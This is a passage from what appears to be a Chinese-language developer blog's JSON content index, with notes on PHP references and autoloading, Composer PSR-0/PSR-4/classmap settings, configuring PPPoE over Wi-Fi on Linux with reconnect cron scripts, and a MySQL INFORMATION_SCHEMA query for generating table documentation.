代，它驅動了 PHP4，對於變量的 static 和 global 定義是以引用的方式實現的。例如，在一個函數域內部用 global 語句導入的一個真正的全局變量實際上是建立了一個到全局變量的引用。這有可能導致預料之外的行為，如以下例子所演示的：\n\n```php\n// 類似的行為也適用於 static 語句。引用並不是靜態地存儲的：\n//以下code為php4\n<?php\nfunction &get_instance_ref() {\n    static $obj;\n\n    echo 'Static object: ';\n    var_dump($obj);\n    if (!isset($obj)) {\n        // 將一個引用賦值給靜態變量\n        $obj = &new stdclass;\n    }\n    $obj->property++;\n    return $obj;\n}\n\nfunction &get_instance_noref() {\n    static $obj;\n\n    echo 'Static object: ';\n    var_dump($obj);\n    if (!isset($obj)) {\n        // 將一個對象賦值給靜態變量\n        $obj = new stdclass;\n    }\n    $obj->property++;\n    return $obj;\n}\n\n$obj1 = get_instance_ref();\n$still_obj1 = get_instance_ref();\necho \"\\n\";\n$obj2 = get_instance_noref();\n$still_obj2 = get_instance_noref();\n?>\n```\n\n官網還有提到一個可能會遇到的錯誤問題\n\n- [[PHP]Only variables should be passed by reference - 王永濤的个人页面 - 开源中国](https://my.oschina.net/wangyongtao/blog/531812)\n- [PHP: Only variables should be passed by reference – James' Desk](https://vijayasankarn.wordpress.com/2017/08/28/php-only-variables-should-be-passed-by-reference/)\n\n首先先提提`array_push(array(), 'foo');`，程式會顯示錯誤，原因需要這個變數被實例\n\n```php\n<?php\nfunction &collector() {\n  static $collection = array();\n  return $collection;\n}\narray_push(collector(), 'foo');\n?>\n```\n\n假如\n\n```php\n<?php\nfunction collector() {\n  static $collection = array();\n  return $collection;\n}\narray_push(collector(), 'foo');\n?>\n```\n\n程式會顯示 `Only variables should be passed by reference`\n\n## Passing by Reference\n\n```php\n\n<?php\nfunction foo(&$var)\n{\n    $var++;\n}\n\n$a=5;\nfoo($a);\n// $a is 6 here\n?>\n```\n\n官網有給之前提過的錯誤，`Only variables should be passed by reference`問題\n\n```php\n\n<?php\nfunction foo(&$var)\n{\n    $var++;\n}\nfunction bar() // Note the missing &\n{\n    $a = 5;\n    return $a;\n}\nfoo(bar()); // Produces fatal error as of PHP 5.0.5, strict standards notice\n            // as of PHP 5.1.1, and notice as of PHP 7.0.0\n\nfoo($a = 5); // Expression, not variable\nfoo(5); // Produces fatal error\n\nclass Foobar\n{\n}\n\nfoo(new Foobar()) // Produces a notice as of PHP 7.0.7\n                  // Notice: Only variables should be passed by reference\n?>\n```\n\n## Unsetting References\n\n```php\n<?php\n$a = 1;\n$b =& $a;\nunset($a);\nvar_dump($a); # null\nvar_dump($b); # 1\n?>\n```\n\n> won't unset $b, just $a.\n> Again, it might be useful to think about this as analogous to the Unix **unlink** call.\n\n用 Linux 的 link hard 觀念確實方便理解\n\n## Spotting References\n\n### global References\n\n> When you declare a variable as global \\$var you are in fact creating reference to a global variable. That means, this is the same as:\n\n```php\n<?php\n$var =& $GLOBALS[\"var\"];\n?>\n```\n\n> This also means that unsetting \\$var won't unset the global variable.\n\n意思是 unset 變數也不會影響到全域變數\n\n### \\$this\n\nIn an object method, \\$this is always a reference to the called object.\n\n\\$this 參照呼叫實例物件\n\n## 心得\n\n費很多功夫整理這個，光吸收可能需要花費一堆時間\n因為想進入 PHP 領域，了解這個應該也是必經之道\n平常也很少機會用`&`這玩意吧\n有空整理一下 PHP 物件導向觀念。\n","tags":["php"],"categories":["PHP"]},{"title":"Linux在Wifi使用pppoe連線後，重開機不能連線上網","url":"%2Fblog%2F2019%2F01%2F27%2FLinux%E5%9C%A8Wifi%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E5%BE%8C%EF%BC%8C%E9%87%8D%E9%96%8B%E6%A9%9F%E4%B8%8D%E8%83%BD%E9%80%A3%E7%B7%9A%E4%B8%8A%E7%B6%B2%2F","content":"\n在使用[Linux 使用 pppoe 連線方法小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/01/26/Linux%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/)後\n重開機發現不能上網\n我還以為是 wifi 壞掉\n好在最後查到原因\n在此筆記\n\n<!--more-->\n\n首先，我在`sudo vim /etc/network/interfaces`\n\n```\n# interfaces(5) file used by ifup(8) and ifdown(8)\nauto lo\niface lo inet loopback\n\niface dsl-provider inet ppp\npre-up /bin/ip link set wlp3s0 up # line maintained by pppoeconf\nprovider dsl-provider\n\nauto wlp3s0\niface wlp3s0 inet manual\n```\n\n在意開始之前，只有這兩段\n\n```\nauto lo\niface lo inet loopback\n```\n\n~~不過，重開機才能確定網路才能設定到~~\n後來網路上找到`sudo service networking restart`\n不過我在 ElementaryOS 上沒有什麼效果\n後來\n\n```\nsudo service network-manager restart\n```\n\n發現桌面右上角圖示有重新載入\n可正常載入網路狀況\n\n最後發現是`iface wlp3s0 inet manual`這段影響的\n不過我還是保留一開始的那兩行\n註解掉後還是能用 pppoe 連線\n\n網路設定我就不深入研究了，相關 Linux 設定方法如下\n\n- [Debian / Ubuntu Linux 網路設定範例 | Tsung's Blog](https://blog.longwin.com.tw/2011/02/linux-network-set-example-2011/)\n- [Linux 网络接口配置（/etc/network/interfaces） - 邱凯翔 Edward 的个人博客 - CSDN 博客](https://blog.csdn.net/u011077672/article/details/71123319)\n- [第 5 章 網絡設置](https://www.debian.org/doc/manuals/debian-reference/ch05.zh-tw.html)\n- [葉難: Raspberry Pi：固定私有 IP 與 dhcpcd](http://yehnan.blogspot.com/2016/05/raspberry-piipdhcpcd.html)\n- [树莓派 3 设置静态 ip dhcpcd vs /etc/network/interfaces - yjbaobo 的博客 - CSDN 博客](https://blog.csdn.net/yjbaobo/article/details/75146840)\n\n\n**重新檢查連線**\n\n[小狐狸事務所: 樹莓派自動偵測網路斷線時重開機的方法](http://yhhuang1966.blogspot.com/2018/01/blog-post.html)\n[Rebooting the Raspberry Pi when it loses wireless connection | We Work We Play](https://weworkweplay.com/play/rebooting-the-raspberry-pi-when-it-loses-wireless-connection-wifi/)\n\n```\nping -c4 192.168.1.1 > /dev/null\n \nif [ $? != 0 ] \nthen\n  sudo /sbin/shutdown -r now\nfi\n```\n\n*/5 * * * * /usr/bin/sudo -H /usr/local/bin/checkwifi.sh >> /dev/null 2>&1\n\n```\nping -c4 192.168.1.1 > /dev/null\n \nif [ $? != 0 ] \nthen\n  echo \"No network connection, restarting wlan0\"\n  /sbin/ifdown 'wlan0'\n  sleep 5\n  /sbin/ifup --force 'wlan0'\nfi\n```\n\n\n**2.為了要使raspberry pi  不要進入省電或自動將無線網路關掉**\n參考:[IT學習日誌: [Raspberry Pi 2 ModelB] 無線網路常常斷線解決方法](http://learn-infotech-blog.blogspot.com/2015/04/raspberry-pi-2-modelb.html)\n在/etc/network/interfaces\n加上一行\nwireless-power off\n 外\n\n修改   /etc/kbd/config \n將 BLANK_TIME= 改為 BLANK_TIME=0 \n和 POWERDOWN_TIME=  改為  POWERDOWN_TIME=0 ","tags":["wifi"],"categories":["Linux"]},{"title":"Linux使用pppoe連線方法小記","url":"%2Fblog%2F2019%2F01%2F26%2FLinux%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98%2F","content":"\n最近在好奇 pppoe 到底能不能走 wifi\ngoogle 一下發現[[問題] 走 Wi-Fi 可以搭配 PPPoE 嗎? - 看板 NextTV - 批踢踢實業坊](https://www.ptt.cc/bbs/NextTV/M.1338039177.A.D3D.html)\n這篇有人說可以也有人說不行...\n其中一段`cassine:PPPoE顧名思義就是PPP over Ethernet，不是PPP over WiFi`\n感覺還滿有道理的\n不過還是有看到留言說可以使用\n今天要來破解是不是真的...\n\n<!--more-->\n\n好啦，突然想到家裡有一台 surface\n直接連 wifi 做 pppoe 連線就可以馬上知道結果\n結果**可以**\n但是不知道 Linux 能不能用?\n\n簡單記錄一下怎麼使用\n\n```bash\n# 安裝pppoeconf\nsudo apt-get install pppoeconf\n# 設定\nsudo pppoeconf\n```\n\n設定可以參考[沉思的伊文: Raspberry Pi 樹莓派 ADSL PPPoE 連線到網際網路](http://thinker-evans.blogspot.com/2015/04/raspberry-pi-adsl-pppoe.html)\n'noauth'跟'defaultroute'這個選 yes\n\n```\n向配置文件添加 『noauth' 和 『defaultroute'\nnoauth 不認證遠端身份，家庭寬帶默認 Yes 即可\ndefaultroute 添加默認路由，不手動改路由表或者特殊需求默認 Yes 即可\n參考[【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space](https://lensual.space/brain-hole/846.html)\n```\n\n[linux 添加静态路由 - leon - CSDN 博客](https://blog.csdn.net/moreorless/article/details/5397427)\nMTU 選項也選 yes\n詳細:[小議 TCP 的 MSS(最大分段)以及 MTU - 王朝網路 - wangchao.net.cn](http://tc.wangchao.net.cn/bbs/detail_1450004.html)\n[【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space](https://lensual.space/brain-hole/846.html)\n裡面都詳細提到\n\n```\nMTU 最大傳輸單元，二層幀的淨荷\nMSS 最大報文長度，TCP 協議特性，TCP 協議的淨荷，用於協商適應路徑中的 MTU\nEthernet 的 MTU 為 1500 (Byte) ，超過 1500 的載荷 ( payload ) 將被分段，最大幀長度為 Eth Header(14) + Payload(1500) + FCS(4) = 1518 (Byte)。其實 FCS 用 wireshark 抓包看不到的，用於校驗已經被系統底層剔除。另外以太網規範還有前導碼和幀間隔，那些是用來底層收發控制相關的（誤\nPPP 的 MTU 同為 1500，最大幀長度為 PPP Header(5) + Payload(1500) + FCS(2) + Flag(1) = 1508 (Byte)。\n要把 PPP 塞進 Ethernet 就是 PPPOE，需要把 PPP 的 MTU 縮減才可以使得 PPP 滿足 Ethernet 的 MTU。\n原來的 PPP 最大會出現 1508 的幀，現在需要控制在 1500 以內。PPP 的 MTU 就是 1500 – (1508 – 1500) = 1492。\n所以 PPPOE 的 MTU 通常為 1492 (Byte) ，以便在 MTU 為 1500 的 Ethernet 上運行。\nMSS 箝制(Clamping) 會修改 TCP SYN 的 MSS 以符合當前的 MTU。因為置於路由器後面的主機使用的是 MTU 為 1500 的 Ethernet 。雖然 ICMP 協議可以在傳輸過程中修正 TCP 的 MSS ，但是部分運營商和設備考慮到安全問題或者就是不想讓你 ping 和 tracertoute 免得投訴他們禁止了 ICMP 協議。\n```\n\n基本上設定都是 yes\n\n連線\n\n```bash\n# 連線dsl-provider設定檔\npon dsl-provider\n# 斷線pppoe\npoff dsl-provider\n# 查詢狀態\nplog\nifconfig\n# 關閉全部pppoe\npoff -a\n```\n\n```\nPPPOE設定檔\n    /etc/ppp/peers/dsl-provider\n    dsl-provider內紀錄ADSL連線相關參數（含帳號），可以修改成hinet以利識別，但改檔名後，pppoe_on_boot檔內的開機自動撥接的設定檔名稱也要跟著換，否則開機自動撥接功能會失效。\n    /etc/ppp/pppoe_on_boot\n    設定系統開機時自動撥接之設定檔，其中「exec pppd call dsl-provider」就是執行撥接時呼叫的設定檔\n```\n\n重新連線 script[Debian Linux: ADSL PPPoE 自動重撥 Script | Tsung's Blog](https://blog.longwin.com.tw/2007/08/adsl_repppoe_script_2007/)\n\n```\n重新撥接的程式 及 設定步驟\n\n重新撥接的程式如下: (vim /usr/bin/repppoe)\n\n    #!/bin/bash\n    #if !ping -c 3 168.95.1.1 > /dev/null 2>&1\n    #if !(cat /proc/net/dev | grep ppp0) > /dev/null 2>&1\n    #if !(cat /proc/net/dev | grep ppp) > /dev/null 2>&1\n    if !ping -c 3 tw.yahoo.com > /dev/null 2>&1\n    then\n    #/usr/bin/poff\n    #/usr/bin/pon dsl-provider\n    /usr/bin/pon\n    fi\n\nchmod +x /usr/bin/repppoe\n設定 crontab (設 root 的 crontab)\n\n    crontab -e # 之後寫入下述\n    */5 * * * * /usr/bin/repppoe\n```\n\n進入就到這邊，以後要用可以翻翻這篇。\n\n小記...，發現 pon 可以一直新增 pppoe 連線\n但好像最後面新增會做 default route\n所以只會有一個 ip 才會連到\n我一直以為都可以連...\n但還是要小心，我記得 hinet 只能撥接 8 個\n[HiNet 客戶服務 > 問題搜尋 > 上網問題](http://service.hinet.net/2004/adslstaticip_faq.htm)\n\n參考來源:\n\n- [沉思的伊文: Raspberry Pi 樹莓派 ADSL PPPoE 連線到網際網路](http://thinker-evans.blogspot.com/2015/04/raspberry-pi-adsl-pppoe.html)\n- [在 Linux 上拨号上网(PPPoE) | 光阴的故事](https://vvl.me/2017/09/30/Linux-PPPoE/)\n- [在 CentOS 7 設定 PPPoE 撥接功能 | Kevin Linul 網路日記本](http://blog.kevinlinul.idv.tw/?p=174)\n- [鳥哥的 Linux 私房菜 -- 連上 Internet 的方法與步驟](http://linux.vbird.org/linux_server/0130internet_connect.php#connect_adsl)\n- [Ubuntu 網路設定 - PPPoE (ADSL) 指令 | 凍仁的筆記](http://note.drx.tw/2008/08/networkpppoe-adsl.html)\n- [【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space](https://lensual.space/brain-hole/846.html)\n- [【Linux】pppoe 網路撥接設定 @ 等待 :: 痞客邦 ::](http://joe01032002.pixnet.net/blog/post/92428377-%E3%80%90linux%E3%80%91pppoe%E7%B6%B2%E8%B7%AF%E6%92%A5%E6%8E%A5%E8%A8%AD%E5%AE%9A)\n- [設定 ADSL（PPPOE）連線 | Gavaee's Blog](https://gavaee.wordpress.com/2011/10/21/%E8%A8%AD%E5%AE%9Aadsl%EF%BC%88pppoe%EF%BC%89%E9%80%A3%E7%B7%9A/)\n- [Debian Linux: ADSL PPPoE 自動重撥 Script | Tsung's Blog](https://blog.longwin.com.tw/2007/08/adsl_repppoe_script_2007/)\n","tags":["network"],"categories":["Linux"]},{"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","url":"%2Fblog%2F2019%2F01%2F19%2Fcomposer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84%2F","content":"\n上次小玩 composer 的自動載入\n但今天使用 autoload\n發現我還不是很了解他的運作原理\npsr0,psr4 差別也看不是很出來他們的差別\n不過說真的，網路上幾乎都是忽略掉 psr0\n可能也不要花太多心力在上面吧\n\n<!--more-->\n\n先講講 composer 自動載入原理\n~~原本想說他是載入 php 會自動載入全部~~\n但無聊看了一下`vendor/autoload.php`原碼\n裡面有用到`spl_autoload`\n所以應該都是基於這個方式去自動載入\n\n但這種自動載入跟`檔名`跟`Class類別`有關係\n\n```\n我之前測試classmap，只要檔名沒對到，`use function xxx`沒吃到\n但是調整對的檔名，`use function xxx`就會吃到\n```\n\n上面那段是我無聊自己試的，其實正常不會用 use function\n一個 php 一個 class 是最好的方式\n\n## classmap\n\n這個指定相關目錄裡所有 php 都會載入 php 裡面的 class\n但 php 未包含 class 不會載入進去\n這個也很常在 composer 看到\n但先說說我自己測試踩到一個雷\n\n當載入沒宣告`namespace`時候\n預設是會自動載入到`全域 namespace`\n但是全域 namespace 不須要做`use xxx`\n這時候做`use xxx`會發生錯誤\n使用會造成錯誤\n`Warning: The use statement with non-compound name 'xxx' has no effect`\n這個別的網頁很少介紹這個\n詳細 laravel 的 dataseeder.php 就是這樣設定的\n檔案 autoload_classmap.php\n\n```php\n    'DatabaseSeeder' => $baseDir . '/database/seeds/DatabaseSeeder.php',\n```\n\n## files\n\n載入指定的 PHP 都會載入進來，重點 class 也都會，其實這邊也可以做 namespace\n但好像大家用全域 namespace 比較多\n還是別亂用好了 XD\n\n## PSR0\n\n這篇已經被廢棄了!!建議可以跳過這邊\n不然會跟 PSR4 搞混，千萬不要像我走火入魔!!!!\n現在我還沒有看過 composer.json 有用到\n\n```json\n        \"psr-0\": {\n            \"Psr0\\\\Lib\\\\\": \"psr0/lib/src/\"\n        },\n```\n\n**上面簡單講，就是\"psr0/lib/src/\"所存在 PSR0/lib/根目錄地方**\n所以對應項面檔案位置 psr0/lib/src/**Psr0/Lib/Psr0LibClass.php**\n\n`psr0/lib/src/Psr0/Lib/Psr0LibClass.php`\n\n```php\n<?php\n// psr-0: \"Psr0\\\\Lib\\\\\": \"psr0/lib/src/\"\nnamespace Psr0\\Lib;\n\nclass Psr0LibClass\n{\n    public static function index()\n    {\n        echo __CLASS__ . \"@\" . __FILE__ . PHP_EOL;\n    }\n}\n```\n\n## PSR4\n\n這個也很常在 composer.json 看到\n相信剛入門一定對下面倒數兩行傻了\n\n```json\n        \"psr-4\": {\n            \"Psr4\\\\Lib\\\\\": \"psr4/lib/src/\",\n            \"App\\\\Controllers\\\\\": \"app/controllers/\",\n            \"App\\\\Models\\\\\": \"app/models/\"\n```\n\npsr4/lib/src/Psr4LibClass.php\n\n```php\n<?php\n// psr-4: \"Psr4\\\\Lib\\\\\": \"psr4/lib/src/\"\nnamespace Psr4\\Lib;\n\nclass Psr4LibClass\n{\n    public static function index()\n    {\n        echo __CLASS__ . \"@\" . __FILE__ . PHP_EOL;\n    }\n}\n```\n\n`App\\\\Controllers\\\\`和`App\\\\Models\\\\`怎麼可以投同時宣告\n這邊先講我怎麼看這段在幹嘛\n**psr4/lib/src/目錄下，都已 Psr4\\Lib\\ namespace 宣告為主**\n以此類推\n`App\\\\Controllers\\\\`→`app/controllers/`\n`App\\\\Models\\\\`→`app/models/`\n\n好了，**`App\\\\Controllers\\\\`和`App\\\\Models\\\\`怎麼可以投同時宣告**\n為什麼不要用`'App\\\\': 'app'`\n[千锋最新 php 视频教程完整 psr4Autoload 类\\_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili](https://www.bilibili.com/video/av14240417?from=search&seid=7612427357758143985)\n看這邊解釋，講如這樣用`App/Controllers/Contollers.php`\n不需要寫`use App/Controllers/Controllers`這麼繞口令\n\n當然 App 資料夾不需要全部東西當 namespace，或者也可以把 namespace 客製化改短一點\nEX:\n\n```json\n            \"Controllers\\\\\": \"app/controllers/\",\n            \"Models\\\\\": \"app/models/\"\n```\n\n相信看很難懂，實作比較快\n[composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国](https://my.oschina.net/sallency/blog/893518)\n看這裡面內容，把所有 code 都在本機跑一下，很容易理解`php -S 0.0.0.0:8000`\n\n## autoload 他怎麼知道載入你自己 lib，跟 vendor 上的 lib\n\n```php\n\n// autoload_classmap.php @generated by Composer\n\n$vendorDir = dirname(dirname(__FILE__));\n$baseDir = dirname($vendorDir);\n\n    ...\n    'App\\\\VoteOption' => $baseDir . '/app/VoteOption.php',\n    'ArithmeticError' => $vendorDir . '/symfony/polyfill-php70/Resources/stubs/ArithmeticError.php',\n\n```\n\n`$vendorDir`試紙 vendor 路徑\n當然做 dirname 就能抓到`$baseDir`，你自己寫的程式自然就會讀到\n\n## 總結\n\n最後，新增 psr0/psr4 跟修改 classmap，記得做`compser dump-autoload`\n你說我怎麼沒有提到 psr0`_`問題，我已經不想深入太多，可參考別的頁面說明\n最後 psr 是 Fig 訂出來的規範，實際你要怎麼載入 php 有很多種方法\n當然最好**一個檔案一個 class**，大小寫路徑可能也要注意(雖然 php namespace 不分大小寫...)\n但是了解這種載入機制，以後寫元件都是比較好的切入\n\n範例可以參考\n[malagege/PHP_composer_autoload_demo: PHP composer autoload 簡單實例 demo](https://github.com/malagege/PHP_composer_autoload_demo)\n\n參考來源:\n\n- [composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国](https://my.oschina.net/sallency/blog/893518)\n- [psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否](https://segmentfault.com/a/1190000006686978)\n- [php - What Are the Differences Between PSR-0 and PSR-4? - Stack Overflow](https://stackoverflow.com/questions/24868586/what-are-the-differences-between-psr-0-and-psr-4)\n- [深入学习 Composer 自动加载（autoload）机制 - Laravel 学院](https://laravelacademy.org/post/7074.html)\n- [PHP PSR-4 Autoloader 機制 | Tony Blog](http://blog.tonycube.com/2016/09/php-psr-4-autoloader.html)\n- [PHP Composer 以及 PSR 规范 - 知乎](https://zhuanlan.zhihu.com/p/38127465)\n","tags":["autoload"],"categories":["PHP"]},{"title":"從MySQL裡面直接(select)讀取出文件設計書表格格式","url":"%2Fblog%2F2019%2F01%2F19%2F%E8%AE%80%E5%8F%96%E5%87%BA%E6%96%87%E4%BB%B6%E8%A8%AD%E8%A8%88%E6%9B%B8%E8%A1%A8%E6%A0%BC%E6%A0%BC%E5%BC%8F%2F","content":"\n最近公司創建 MySQL 需要寫文件\n但是通常我們開工單都是在開發環境建立 MySQL\n手動建立 Table 產生 SQL 出來\n最後還需要產生文件\n所以又多一倍功...做那個\n但有時改 DB 地方，文件就會忘記改...\n今天我手動寫出 sql\n讓我不用太花時間方法 XD\n\n<!--more-->\n\n在 MySQL 可以下\n\n```sql\nSELECT '' as NO,\n       if(POSITION(\"PRI\" IN COLUMN_KEY ),'PK','') as '標記',\n       COLUMN_COMMENT as  '名稱',\n       COLUMN_NAME '欄位',\n       COLUMN_TYPE as  '型態',\n       ifnull(COLUMN_DEFAULT,'') as  '預設值',\n       if(IS_NULLABLE='YES','O','') as 'NULL',\n       if(EXTRA='auto_increment','O','') as  'A_I',\n       TABLE_NAME,\n       COLUMN_KEY\nFROM INFORMATION_SCHEMA.COLUMNS\nWHERE TABLE_SCHEMA = 'ooo'  AND TABLE_NAME = 'xxx'\n```\n\n不過在`INFORMATION_SCHEMA.COLUMNS`沒有設定 index\n所以通常正式環境有很多 table 還是不要亂用比較好\n可以直接複製出來貼到 WORD\n\nINFORMATION_SCHEMA.COLUMNS 相關欄位資訊\n參考:[mysql 的 TABLE_SCHEMA 的 sql 和 information_schema 表, MySQL 管理一些基礎 SQL 語句, Changes in MySQL 5.7.2 - t6 - 博客園](https://www.cnblogs.com/timxgb/p/7862929.html)\n\n```\nSCHEMATA表：提供了關於數據庫的信息。\nTABLES表：給出了關於數據庫中的表的信息。\nCOLUMNS表：給出了表中的列信息。\nSTATISTICS表：給出了關於表索引的信息。\nUSER_PRIVILEGES表：給出了關於全程權限的信息。該信息源自mysql.user授權表。\nSCHEMA_PRIVILEGES表：給出了關於方案（數據庫）權限的信息。該信息來自mysql.db授權表。\nTABLE_PRIVILEGES表：給出了關於表權限的信息。該信息源自mysql.tables_priv授權表。\nCOLUMN_PRIVILEGES表：給出了關於列權限的信息。該信息源自mysql.columns_priv授權表。\nCHARACTER_SETS表：提供了關於可用字符集的信息。\nCOLLATIONS表：提供了關於各字符集的對照信息。\nCOLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用於校對的字符集。\nTABLE_CONSTRAINTS表：描述了存在約束的表。\nKEY_COLUMN_USAGE表：描述了具有約束的鍵列。\nROUTINES表：提供了關於存儲子程序（存儲程序和函數）的信息。此時，ROUTINES表不包含自定義函數（UDF）。\nVIEWS表：給出了關於數據庫中的視圖的信息。\nTRIGGERS表：提供了關於觸發程序的信息。\n```\n\n相關資料:\n\n- [MySQL :: MySQL 5.7 Reference Manual :: 8.2.3 Optimizing INFORMATION_SCHEMA Queries](https://dev.mysql.com/doc/refman/5.7/en/information-schema-optimization.html)\n- [mysql 的 TABLE_SCHEMA 的 sql 和 information_schema 表, MySQL 管理一些基礎 SQL 語句, Changes in MySQL 5.7.2 - t6 - 博客園](https://www.cnblogs.com/timxgb/p/7862929.html)\n- [sql - How do I find out which tables have no indexes in MySQL - Stack Overflow](https://stackoverflow.com/questions/7233703/how-do-i-find-out-which-tables-have-no-indexes-in-mysql)\n","tags":["docs"],"categories":["寫程式一些事"]},{"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","url":"%2Fblog%2F2019%2F01%2F18%2FPHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5%2F","content":"\n最近有計畫學 Laravel\n不過想趁機會把 PHP `Namespace`搞清楚\n我在想`autoload`自動載入是甚麼機制的\n最近小小的玩了一下，才知道這個`自動載入`是怎麼用的\n其實我覺得也不是完全自動載入阿~~終究還是手動需做載入一段程式\n\n<!--more-->\n\n## PHP 原有 autoload 方式\n\ninclude, include_once, require , require_once\n\n都是載入功能。\n比較特別注意 include 當載入失敗會跳出警告，但是不會停止程式\nrequire 載入失敗會跳出錯誤，不會繼續執行下面程式\n\n常常忘記哪個會載入錯誤 orz\n順便記載這邊\n\n## PHP Autoload\n\n前面兩個是比較早期的自動載入方式。簡單來講就是自動載入`xxx.php`方法\n後面 namespace 可搭配`composer`實作\n\n- \\_\\_autoload\n- spl_autoload\n- autoload 與 namespace\n\n[PHP 系列 - Autoload 自動載入 « Eric G. Huang 不像樣工程師](http://justericgg.logdown.com/posts/196891-php-series-autoload) {% asset_link web1.png 備份圖 %}\n上面連結介紹太清楚了。\n我這邊仔細記錄我實務的問題\n\n## 常常搞錯的觀念\n\n我是有學過 Java，所以對 Java Namespace 不是很陌生\n但當初看 PHP 的 Namespace 有看沒有懂\n學得他們很像，但又不是很像\n但說 Java Namespace 定義很清楚\nPHP 並沒有那麼清楚(畢竟是腳本語言....)\n\n### 還是需要放置載入程式\n\n首先來看看 Laravel 的 Controller.php\n\n```php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Foundation\\Bus\\DispatchesJobs;\nuse Illuminate\\Routing\\Controller as BaseController;\nuse Illuminate\\Foundation\\Validation\\ValidatesRequests;\nuse Illuminate\\Foundation\\Auth\\Access\\AuthorizesRequests;\n\nclass Controller extends BaseController\n{\n    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;\n}\n```\n\n~~看到這個我整個高潮了~~\n其實我以為 PHP 已經完完整整可以自動載入\n不過我自己實作卻是不能...\n最終爬文還是找到答案\n\n~~下面那篇 PO 文跟我一樣 HI XD~~\n[php 的 use 明顯比 require 高端大氣上檔次 - 開源中國](https://www.oschina.net/question/123890_135938?sort=default&p=2)\n[php 使用命名空间:导入导出之疑问 - 开源中国](https://www.oschina.net/question/147332_138188)\n\n為什麼 Laravel 的 Controller.php 可以自動載入\n關鍵還是 index.php 的`require __DIR__.'/../vendor/autoload.php';`\n所以我才說也不是真正的自動載入\n不過方法真的已經比以前好很多\n\n## 發現我自己寫的 PHP 沒辦法 use 使用到\n\n當以為你以為`require 'vendor/autoload.php';`可以載入所有 php 檔案內容\n你可能就大錯特錯了!!!\n\ncomposer.json 有一個 classmap 自動載入\n\n```json\n{\n    ...\n    \"autoload\": {\n    \t\"classmap\": {\n    \t\t\"mylib\"\n    \t}\n    }\n    ...\n}\n```\n\n~~但不能設定`.`~~可以設定`.`\n發現我寫錯了，應該要用陣列才對\n上面能跑純屬意外\n\n```json\n{\n    ...\n    \"autoload\": {\n    \t\"classmap\": [\n    \t\t\".\"\n    \t]\n    }\n    ...\n}\n```\n\n## 發現新增檔案跟修改 class 名稱沒有自動載入到\n\n當我發現這件事，還以為我哪裡寫錯了\n其實有看到這篇[php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork](http://jsnwork.kiiuo.com/archives/2437/php-composer-json-%e8%a8%ad%e5%ae%9a-classmap-%e6%8c%87%e5%ae%9a%e8%87%aa%e5%8b%95%e8%ae%80%e5%8f%96%e7%9a%84%e6%aa%94%e6%a1%88%e6%88%96%e8%b7%af%e5%be%91/)\nvendor/composer/autoload_classmap.php\n\n```php\n<?php\n\n// autoload_classmap.php @generated by Composer\n\n$vendorDir = dirname(dirname(__FILE__));\n$baseDir = dirname($vendorDir);\n\nreturn array(\n    'mylib\\\\Test' => $baseDir . '/mylib/test.php',\n);\n\n```\n\n看到原來自動載入原來不是真的跑每一層資料夾\n是透過暫存方式載入\n之前一直還在想有什麼辦法看到目前會自動載入哪些\n看來還是有辦法知道的\n\n## PSR0 , PSR4\n\n看了一下好像都是自動載入\nPSR0 命名規則跟 JAVA 很像\n但是 PSR4 規則也不一定要跟 JAVA 擺放位置一樣\n我也沒看很詳細，有空再仔細吸收....\n[psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否](https://segmentfault.com/a/1190000006686978)\n\n## Namespace 一些事\n\nNamespace 是不分大小寫的，跟 class、function 一樣沒有分\n但是在 use 引用變數(ex:\\$a)\n想說 class 會不會跟 function 一樣不能共用一樣名字\n但測試結果是可以的\n我還滿驚呆\n\n```php\n<?php\n        //Enter your code here, enjoy!\n\nclass A\n{\n    public function __toString() {\n        return 'A';\n    }\n}\n\nfunction a(){\n    echo 'aa';\n}\n\necho new A();\necho '========';\necho  A();\n```\n\n結果\n\n```\nA========aa\n```\n\n那同時去做 use A 不知道會\n但用在 use 呢?!\n經過小小實驗(未確任是否正確，自己得出的結論)\nfunction 要用通常是要用\n`use function xxxx`\n但是做 classmap 跟 psr-4 都載入不到(不知道為什麼)\n但有找到[Composer/PSR - How to autoload functions? - Stack Overflow](https://stackoverflow.com/questions/24171078/composer-psr-how-to-autoload-functions)\n[深入 Composer autoload | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区](https://laravel-china.org/topics/1002/deep-composer-autoload)\n要選`files`\n不過沒有什麼事情還是不要用 function 吧 XD\n這我就沒實作確認\n\n感覺 composer,psr0,psr4 之後還是需要好好了解\n先記錄到這邊\n\n參考來源：\n\n- [有人用过 PHP 的 use function 吗？ | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区](https://laravel-china.org/index.php/topics/6998/have-anyone-used-phps-use-function)\n- [PHP 系列 - Autoload 自動載入 « Eric G. Huang 不像樣工程師](http://justericgg.logdown.com/posts/196891-php-series-autoload)\n- [[PHP]require 和 include @ Jonas's Blog :: 痞客邦 